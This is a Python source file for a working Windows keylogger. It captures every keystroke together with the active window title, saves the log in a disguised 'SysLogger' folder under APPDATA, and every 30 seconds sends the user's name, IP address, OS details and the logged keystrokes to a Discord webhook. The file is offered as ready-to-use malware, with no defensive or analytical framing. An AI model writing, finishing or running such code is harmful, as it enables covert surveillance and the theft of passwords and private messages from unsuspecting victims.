import os
import time
import socket
import requests
from datetime import datetime
from pynput import keyboard
import win32gui
import getpass
import platform

# --- Setup ---
APPDATA = os.getenv('APPDATA')
log_dir = os.path.join(APPDATA, 'SysLogger')
os.makedirs(log_dir, exist_ok=True)

log_file = os.path.join(log_dir, 'keylog.txt')
webhook_url =''  # Set your Discord webhook URL here
send_interval = 30 # every 30 seconds

# --- State ---
current_window = None
buffer = ""
first_run = True


def get_system_info():
    user = getpass.getuser()
    ip = socket.gethostbyname(socket.gethostname())
    system = platform.system()
    release = platform.release()
    return f"📡 System Info:\nUser: {user}\nIP: {ip}\nOS: {system} {release}\n"


def get_active_window():
    try:
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        return window
    except:
        return "Unknown Window"


def send_to_discord(content):
    data = {
        "content": f"```\n{content}\n```"
    }
    try:
        requests.post(webhook_url, data=data)
    except Exception as e:
        print("Error sending to Discord:", e)


def write_log(data):
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(data)


def on_press(key):
    global buffer, current_window, first_run

    try:
        key_name = key.char
    except AttributeError:
        key_name = f"[{key}]"

    new_window = get_active_window()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if new_window != current_window:
        current_window = new_window
        header = f"\n\n[{timestamp}] ⬛ Active Window: {current_window}\n"
        buffer += header
        write_log(header)

    buffer += key_name
    write_log(key_name)


def send_log_periodically():
    global buffer, first_run
    while True:
        time.sleep(send_interval)
        if first_run:
            sysinfo = get_system_info()
            send_to_discord(sysinfo)
            first_run = False

        if buffer.strip():
            send_to_discord(buffer)
            buffer = ""


# --- Run ---
from threading import Thread

Thread(target=send_log_periodically, daemon=True).start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
